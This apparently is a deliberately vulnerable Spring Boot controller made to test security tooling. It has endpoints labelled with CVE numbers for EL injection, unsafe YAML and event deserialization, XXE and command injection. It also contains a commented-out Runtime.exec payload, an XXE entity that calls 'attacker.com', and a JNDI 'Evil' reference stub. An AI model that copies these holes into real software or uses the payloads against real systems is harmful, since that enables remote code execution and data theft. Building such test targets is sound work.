package com.example.shirodemo;

import com.cronutils.model.CronType;
import com.cronutils.validation.Cron;
import com.github.pagehelper.Page;

//import org.apache.hadoop.util.Shell.ShellCommandExecutor;
import org.codehaus.plexus.util.cli.Commandline;
import org.ho.yaml.Yaml;

import com.github.pagehelper.PageHelper;
import com.jd.sec_api.SecApi;

import liquibase.changelog.ChangeLogParameters;
import liquibase.parser.core.xml.XMLChangeLogSAXParser;
import liquibase.sdk.resource.MockResourceAccessor;

import org.slf4j.ext.EventData;
import org.springframework.boot.autoconfigure.batch.BatchProperties.Job;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PathVariable;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.util.UriComponentsBuilder;
import org.apache.commons.beanutils.BeanUtils;
//import com.sun.jndi.rmi.registry.ReferenceWrapper;
//import org.w3c.dom.Document;
//import org.w3c.dom.NodeList;

//conf import org.apache.hadoop.mapred.JobConf;
//conf import org.apache.hadoop.mapred.JobHistory.JobInfo;
//import javax.naming.*;
//import javax.naming.Context;
//import javax.naming.InitialContext;
//import javax.naming.NamingException;
//import javax.naming.Reference;
/*import javax.naming.directory.DirContext;
import javax.naming.directory.SearchControls;
import javax.naming.directory.SearchResult;
import javax.servlet.http.HttpServlet;*/
//import javax.servlet.http.HttpServletRequest;
//import javax.xml.xpath.*;
//import javax.xml.xpath.XPathFactory;
//import javax.xml.xpath.XPath;
//import javax.xml.xpath.XPathExpression;
//import javax.xml.xpath.XPathConstants;
//import javax.xml.xpath.XPathExpressionException;
//import java.beans.*;
//import java.io.ByteArrayInputStream;
import java.io.File;
//import java.io.IOException;
//import java.rmi.RemoteException;
//import java.rmi.registry.LocateRegistry;
//import java.sql.*;
/*import java.util.ArrayList;
import java.util.HashMap;
import java.util.Map;*/
//import java.util.Properties;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;

import com.jd.jss.Credential;
import com.jd.jss.JingdongStorageService;
import com.jd.jss.client.ClientConfig;
/*import com.jd.sec_api.*;
import com.jd.sec_api.extra.codecs.*;*/

import javax.annotation.Resource;
//import javax.xml.parsers.DocumentBuilder;
//import javax.xml.parsers.DocumentBuilderFactory;
import javax.servlet.ServletRequest;
import org.xml.sax.InputSource;
//import org.yaml.snakeyaml.Yaml;

import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServletRequest;
import java.net.*;
import java.util.HashMap;
import java.util.Map;
import java.util.Set;

import org.w3c.dom.Node;
import javax.xml.namespace.QName;
import javax.xml.stream.XMLStreamReader;
import javax.xml.transform.Source;
//conf import javax.xml.xquery.*;
import java.io.InputStream;
import java.io.Reader;
import java.lang.reflect.InvocationTargetException;
import java.util.TimeZone;
import org.ttzero.excel.reader.ExcelReader;

//CVE-2021-41269

import javax.validation.ConstraintViolation;
import javax.validation.Validation;
import javax.validation.Validator;
import javax.validation.ValidatorFactory;

//CVE-2022-0265
import com.hazelcast.config.Config;

@RestController
public class DemoController {
    @Resource
    private SecApi secapi;
    @RequestMapping(path = "/CVE-2021-41269")
    public String cve_2021_41269(String value) throws FileNotFoundException, IOException {
    Job job = new Job();
    //job.setCronExpression("T(java.lang.Runtime).getRuntime().exec(\"cmd whami\"); // 4 5 [${''.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('js').eval(validatedValue)}]");
    job.setCronExpression(value);
    ValidatorFactory factory = Validation.buildDefaultValidatorFactory();
    Validator validator = factory.getValidator();

    Set<ConstraintViolation<Job>> constraintViolations = validator.validate(job);
    System.out.println("errmsg");
    String errmsg = constraintViolations.iterator().next().getMessage();
    System.out.println(errmsg);
        return "ok";
    }
    public static class Job {
            @Cron(type = CronType.SPRING)
            private String cronExpression;

            String getCronExpression() {
            return cronExpression;
            }
            void setCronExpression(String cronExpression) {
            this.cronExpression = cronExpression;
            }
    }

    @RequestMapping(path = "/CVE-2024-22243")
    public String cve_2024_22243(String value) throws FileNotFoundException, IOException {
   

        UriComponentsBuilder.fromUriString(value);
        return "ok";
    }

    @RequestMapping(path = "/CVE-2022-0265")
    public String cve_2022_0265(String value) throws FileNotFoundException, IOException {
        Config cfg = Config.loadFromStream(value);
        return "ok";
    }

    @PostMapping("/executeCommand")
    public void executeCommand(String userInput) {
        // 注意：以下代码是示例，实际使用中应避免这样做。
        Commandline commandLine = new Commandline();
        // 如果userInput未经适当验证或转义，则可能导致命令注入
        commandLine.setExecutable(userInput);

        // 其他设置...

        // 执行命令行
        try {
            commandLine.execute();
        } catch (Exception e) {
            // 错误处理
        }
    }
    @PostMapping("/logEvent")
    public String logEvent(@RequestBody String xmlData) {
        try {
            // 这里的EventData类在SLF4J 1.7.25及更早版本中存在反序列化漏洞
            EventData data = new EventData(xmlData);
            // 假设这里会将EventData记录到日志中
            // ...
        } catch (Exception e) {
            // 在实际应用中，应该处理异常，但这里我们只是返回错误信息
            return "Error logging event: " + e.getMessage();
        }
        return "Event logged successfully";
    }

    @PostMapping("/deserializeYaml")
    public String deserializeYaml(@RequestBody String yamlInput) {
        Yaml yaml = new Yaml();

        try {
            // 这里直接使用 Yaml#load 对传入的 YAML 字符串进行反序列化
            // 这是不安全的，因为它可以执行任意代码
            Object result = yaml.load(yamlInput);
            return "Deserialized object: " + result;
        } catch (Exception e) {
            return "Exception during deserialization: " + e.getMessage();
        }
    }
    @GetMapping("/parse")
    public String parseXml(String xmlInput) {
        // Example XML string that could be used to exploit XXE
        String xmlInput1 = "<!DOCTYPE root [\n" +
                "  <!ENTITY % external SYSTEM \"http://attacker.com\">\n" +
                "%external;\n" +
                "]>\n" +
                "<root/>\n";

        XMLChangeLogSAXParser parser = new XMLChangeLogSAXParser();
        HashMap hashMap = new HashMap<String, String>();
        hashMap.put("xxe.xml", xmlInput);
        MockResourceAccessor ra = new MockResourceAccessor(hashMap);

        try {
            parser.parse("xxe.xml", new ChangeLogParameters(), ra);
            return "XML parsed successfully";
        } catch (Exception e) {
            return "Error parsing XML: " + e.getMessage();
        }
    }
    @RequestMapping(path = "/permit/{value}")
    public String permit(@PathVariable final String value) throws FileNotFoundException, IOException {
        // String safe = SecApi.encoder().encodeForSQL(MySQLCodec.getInstance(), value);
        // String safe = SecApi.validator().isValidSafeSqlArg(value)?"true":"false";

        Page<Object> ok = PageHelper.startPage(1, 1, true);

        System.out.println("success!");
        return "ok";
    }
    
    @RequestMapping("/ccc")
    public Boolean testcount(HttpServletRequest request) throws IllegalAccessException, InvocationTargetException {
        String url =  request.getParameter("url");
        return SecApi.validator().jdSsrfExternalCheck(url);
    }
    /*
     * @RequestMapping(path = "/testJndi") public String testJndi(final String url)
     * throws NamingException, RemoteException { final Properties env = new
     * Properties(); env.put(Context.INITIAL_CONTEXT_FACTORY,
     * "com.sun.jndi.rmi.registry.RegistryContextFactory");
     * env.put(Context.PROVIDER_URL, "rmi://127.0.0.1:1099"); final InitialContext
     * ctx = new InitialContext(env); LocateRegistry.createRegistry(1099); final
     * Reference reference = new Reference("Evil", "Evil", url); new
     * ReferenceWrapper(reference); final ReferenceWrapper referenceWrapper = new
     * ReferenceWrapper(reference); ctx.bind("evil", referenceWrapper); return
     * "success"; }
     */
    /*
     * @RequestMapping(path = "/testcmd") public void testJcmd(final String dir)
     * throws IOException, SQLException { System.out.println(dir); final String[]
     * cmdList = new String[] { "cmd", "/c", "dir " + dir }; // String[] cmdList =
     * new String[]{"/bin/sh", "-c", "ls",";pwd"}; // String[] cmdList = new
     * String[]{"/bin/sh", "-c", "\"ls;pwd\""}; final Process p =
     * Runtime.getRuntime().exec(cmdList); }
     * 
     * @RequestMapping(value = "/XPathTest_S_12_1_0001", method = RequestMethod.GET)
     * public NodeList XPathTest_S_12_1_0001(final Document document, final String
     * string) { final XPathFactory xPathfactory = XPathFactory.newInstance(); final
     * XPath xpath = xPathfactory.newXPath(); try { final XPathExpression xp =
     * xpath.compile("//*[@begin]" + string); final NodeList timedNodes = (NodeList)
     * xp.evaluate(document, XPathConstants.NODESET); return timedNodes; } catch
     * (final XPathExpressionException e) { throw new RuntimeException(e); } }
     */
    @RequestMapping(value = "/test", method = RequestMethod.GET)
    public void handle(final HttpServletRequest request) throws Exception {
        final String name = request.getParameter("name");
        final ClientConfig config = new ClientConfig();
        final JingdongStorageService jss = new JingdongStorageService(new Credential("accessKey", "secretKey"), config);

        // final String md5 =
        // jss.bucket("dengliang.org").object("index.html").a().b().entity(new
        // File("/export/test.html")).contentType(name).put();
    }

    /*
     * @RequestMapping(value = "/testXXE", method = RequestMethod.GET) public void
     * testXXE(final HttpServletRequest request) throws Exception { final String
     * code = request.getParameter("code"); final String body =
     * request.getParameter("body"); final DocumentBuilderFactory dbf =
     * DocumentBuilderFactory.newInstance(); // 禁用 DOCTYPE
     * dbf.setExpandEntityReferences(false);
     * dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
     * dbf.setXIncludeAware(false); final DocumentBuilder db =
     * dbf.newDocumentBuilder();
     * 
     * final Document doc = db.parse(new ByteArrayInputStream(body.getBytes(code)));
     * }
     */

    public static void main(String[] args) throws URISyntaxException, MalformedURLException {
        URI url = new URI("http://img30.360buyimg.com");
        String urlstr = "http://img30.360buyimg.com";
        String decodeUrl = URLDecoder.decode(urlstr);
        String[] allow =new String[]{"360buyimg.com"};
        System.out.println(SecApi.validator().jdRedirectCheck(urlstr,allow));
        System.out.println(1);
    }
}
